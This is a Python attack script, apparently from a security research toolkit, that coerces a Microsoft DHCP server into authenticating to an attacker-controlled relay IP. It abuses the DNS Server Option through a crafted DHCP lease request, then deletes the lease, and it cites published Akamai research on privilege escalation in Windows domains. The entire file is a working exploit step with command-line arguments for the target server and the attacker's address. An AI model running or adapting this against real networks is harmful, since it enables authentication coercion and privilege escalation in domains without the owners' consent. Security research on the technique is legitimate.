from networking.dhcp_client import DHCPClient
import argparse
from scapy.all import get_if_hwaddr

# Abuse the DNS Server Option to coerce Microsoft DHCP server authentication.
# For more information about this technique:
# https://akamai.com/blog/security-research/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains

parser = argparse.ArgumentParser()
parser.add_argument("-i","--iface", help="The name of the interface to use when sending packets", required=True)
parser.add_argument("-d", "--domain-name", help="The FQDN of the domain we are targeting", required=True)
parser.add_argument("-s", "--target-server", help="The IP address of the target DHCP server", required=True)
parser.add_argument("-c", "--coerce-ip", help="An IP address that is part of the DHCP coercion "
                                              "scope we previously created on the target server", required=True)
parser.add_argument("-ip", "--relay-ip", help="The IP address of our machine. This address needs to be part of an "
                                       "existing scope on the target server", required=True)
args = parser.parse_args()


domain_name = args.domain_name

client_id = get_if_hwaddr(args.iface).replace(":","")

fqdn = f"aaa.{domain_name}"

dhcp_client = DHCPClient(args.iface, True, args.target_server)

leased_ip = dhcp_client.dhcp_dora(
    client_id=client_id,
    fqdn=fqdn,
    requested_ip=args.coerce_ip,
    dhcp_server=args.target_server,
    max_retry=3,
    relay_address=args.relay_ip,
)

if not leased_ip:
    print("[*] Failed to get an IP lease from the server.")
else:
    print(f"[*] Successfully leased IP {leased_ip} with FQDN {fqdn}. ")

# Delete the IP lease from the DHCP server
dhcp_client.delete_client_lease(client_id, leased_ip)
